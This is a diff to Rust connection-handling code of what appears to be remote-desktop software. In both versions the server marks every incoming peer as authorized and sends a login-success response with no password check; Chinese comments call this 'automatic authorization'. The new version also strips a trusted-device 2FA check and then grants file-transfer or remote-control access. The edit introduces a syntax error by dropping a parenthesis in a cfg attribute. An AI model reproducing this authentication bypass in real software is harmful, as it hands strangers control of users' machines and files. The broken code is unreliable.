@@ -1,5 +1,5 @@
 use super::{input_service::*, *};
-#[cfg(not(any(target_os = "android", target_os = "ios")))]
+#[cfg(not(any(target_os = "android", target_os = "ios"))]
 use crate::clipboard::{update_clipboard, ClipboardSide};
 #[cfg(any(target_os = "windows", target_os = "linux", target_os = "macos"))]
 use crate::clipboard_file::*;
@@ -1639,24 +1639,25 @@ impl Connection {
             self.options_in_login = Some(o.clone());
         }
         
-        // 添加自动授权逻辑
-        self.authorized = true;  // 直接授权
-        self.send_logon_response().await;  // 发送登录成功响应
+        // 直接授权并发送登录响应
+        self.authorized = true;
+        self.send_logon_response().await;
         
-        if self.require_2fa.is_some() && !lr.hwid.is_empty() && Self::enable_trusted_devices() {
-            let devices = Config::get_trusted_devices();
-            if let Some(device) = devices.iter().find(|d| d.hwid == lr.hwid) {
-                if !device.outdate()
-                    && device.id == lr.my_id
-                    && device.name == lr.my_name
-                    && device.platform == lr.my_platform
-                {
-                    log::info!("2FA bypassed by trusted devices");
-                    self.require_2fa = None;
-                }
-            }
+        // 启动连接管理器
+        self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), true);
+        
+        // 如果是文件传输,则读取目录
+        if let Some((dir, show_hidden)) = self.file_transfer.clone() {
+            let dir = if !dir.is_empty() && std::path::Path::new(&dir).is_dir() {
+                &dir
+            } else {
+                ""
+            };
+            self.read_dir(dir, show_hidden);
+        } else {
+            // 如果是远程控制,则订阅服务
+            self.try_sub_services();
         }
-        self.video_ack_required = lr.video_ack_required;
     }
 
     #[cfg(not(any(target_os = "android", target_os = "ios")))]
